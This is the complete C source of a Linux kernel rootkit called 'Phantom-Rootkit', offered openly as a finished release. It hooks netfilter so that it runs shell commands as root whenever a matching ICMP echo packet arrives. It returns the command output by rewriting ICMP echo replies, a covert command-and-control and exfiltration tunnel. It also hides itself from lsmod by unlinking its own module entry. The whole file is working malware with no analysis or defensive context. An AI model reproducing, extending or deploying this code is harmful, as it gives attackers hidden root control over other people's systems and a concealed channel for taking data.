/*
 * Phantom-Rootkit: Final Release
 * Features: Stealth, Async Execution, ICMP C2 Tunneling
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/string.h>
#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <linux/list.h> 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("pwnxr");

#define MAGIC_PREFIX "cmd:"
#define GET_RESULT_PREFIX "get:" 
#define MAGIC_LEN 4
#define RESPONSE_FILE "/tmp/.phantom_res"
#define MAX_OUTPUT 1024

static char cmd_output[MAX_OUTPUT];
static int cmd_output_len = 0;
static char current_cmd[256];
static struct work_struct my_work; 

// 1. Worker: Execute Command & Save Output
static void execute_command_work(struct work_struct *work) {
    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    char full_cmd[256];
    struct file *f;
    loff_t pos = 0;
    ssize_t read_ret;
    
    // Construct command: cmd > /tmp/.phantom_res 2>&1
    snprintf(full_cmd, 256, "%s > %s 2>&1", current_cmd, RESPONSE_FILE);
    argv[2] = full_cmd;

    // Execute (Wait for completion)
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    // Read Result
    memset(cmd_output, 0, MAX_OUTPUT);
    f = filp_open(RESPONSE_FILE, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        read_ret = kernel_read(f, cmd_output, MAX_OUTPUT - 1, &pos);
        if (read_ret > 0) {
            cmd_output_len = read_ret;
        } else {
            strcpy(cmd_output, "[!] Command executed, no output.");
            cmd_output_len = strlen(cmd_output);
        }
        filp_close(f, NULL);
    } else {
        strcpy(cmd_output, "[!] Failed to open output file.");
        cmd_output_len = strlen(cmd_output);
    }
}

// 2. Netfilter Hooks
static struct nf_hook_ops hook_in_ops;
static struct nf_hook_ops hook_out_ops_local;
static struct nf_hook_ops hook_out_ops_post;

static unsigned int hook_func_in(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    unsigned char *payload;
    int payload_len;

    if (!skb) return NF_ACCEPT;
    ip_header = ip_hdr(skb);
    if (!ip_header || ip_header->protocol != IPPROTO_ICMP) return NF_ACCEPT;

    icmp_header = (struct icmphdr *)((unsigned char *)ip_header + (ip_header->ihl * 4));
    
    if (icmp_header->type == ICMP_ECHO) {
        payload = (unsigned char *)icmp_header + sizeof(struct icmphdr);
        payload_len = skb->len - (ip_header->ihl * 4) - sizeof(struct icmphdr);

        if (payload_len >= MAGIC_LEN && memcmp(payload, MAGIC_PREFIX, MAGIC_LEN) == 0) {
            // Extract command
            memset(current_cmd, 0, 256);
            int copy_len = (payload_len - MAGIC_LEN) < 255 ? (payload_len - MAGIC_LEN) : 255;
            memcpy(current_cmd, payload + MAGIC_LEN, copy_len);
            
            // Schedule Execution
            schedule_work(&my_work);
        }
    }
    return NF_ACCEPT;
}

static unsigned int hook_func_out(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    unsigned char *payload;
    int payload_len;

    if (!skb) return NF_ACCEPT;
    
    ip_header = ip_hdr(skb);
    if (!ip_header || ip_header->protocol != IPPROTO_ICMP) return NF_ACCEPT;

    if (skb_linearize(skb) < 0) return NF_ACCEPT;

    ip_header = ip_hdr(skb);
    icmp_header = (struct icmphdr *)((unsigned char *)ip_header + (ip_header->ihl * 4));

    if (icmp_header->type == ICMP_ECHOREPLY) {
        payload = (unsigned char *)icmp_header + sizeof(struct icmphdr);
        payload_len = skb->len - (ip_header->ihl * 4) - sizeof(struct icmphdr);

        // Check for "get:" request
        if (payload_len >= 4 && memcmp(payload, GET_RESULT_PREFIX, 4) == 0) {
            
            if (skb_ensure_writable(skb, skb->len)) return NF_ACCEPT;

            // Update pointers after ensure_writable
            ip_header = ip_hdr(skb);
            icmp_header = (struct icmphdr *)((unsigned char *)ip_header + (ip_header->ihl * 4));
            payload = (unsigned char *)icmp_header + sizeof(struct icmphdr);

            // Inject Data
            if (cmd_output_len > 0) {
                memset(payload, 0, payload_len);
                // Prevent overflow
                int write_len = (payload_len > cmd_output_len) ? cmd_output_len : payload_len;
                memcpy(payload, cmd_output, write_len);
            } else {
                char *msg = "Processing...";
                strcpy(payload, msg);
            }
            
            // Recalculate Checksum
            icmp_header->checksum = 0;
            icmp_header->checksum = ip_compute_csum((void *)icmp_header, sizeof(struct icmphdr) + payload_len);
        }
    }
    return NF_ACCEPT;
}

static int __init c2_init(void) {
    INIT_WORK(&my_work, execute_command_work);

    // 1. Input Hook
    hook_in_ops.hook = hook_func_in;
    hook_in_ops.hooknum = NF_INET_PRE_ROUTING;
    hook_in_ops.pf = PF_INET;
    hook_in_ops.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &hook_in_ops);

    // 2. Output Hook (Local Out - Primary)
    hook_out_ops_local.hook = hook_func_out;
    hook_out_ops_local.hooknum = NF_INET_LOCAL_OUT;
    hook_out_ops_local.pf = PF_INET;
    hook_out_ops_local.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &hook_out_ops_local);

    // 3. Output Hook (Post Routing - Backup)
    hook_out_ops_post.hook = hook_func_out;
    hook_out_ops_post.hooknum = NF_INET_POST_ROUTING;
    hook_out_ops_post.pf = PF_INET;
    hook_out_ops_post.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &hook_out_ops_post);
    
    // 4. Stealth Mode: Hide from lsmod
    list_del(&THIS_MODULE->list);

    printk(KERN_INFO "Phantom-Rootkit: Loaded & Hidden.\n");
    return 0;
}

static void __exit c2_exit(void) {
    nf_unregister_net_hook(&init_net, &hook_in_ops);
    nf_unregister_net_hook(&init_net, &hook_out_ops_local);
    nf_unregister_net_hook(&init_net, &hook_out_ops_post);
    cancel_work_sync(&my_work);
}

module_init(c2_init);
module_exit(c2_exit);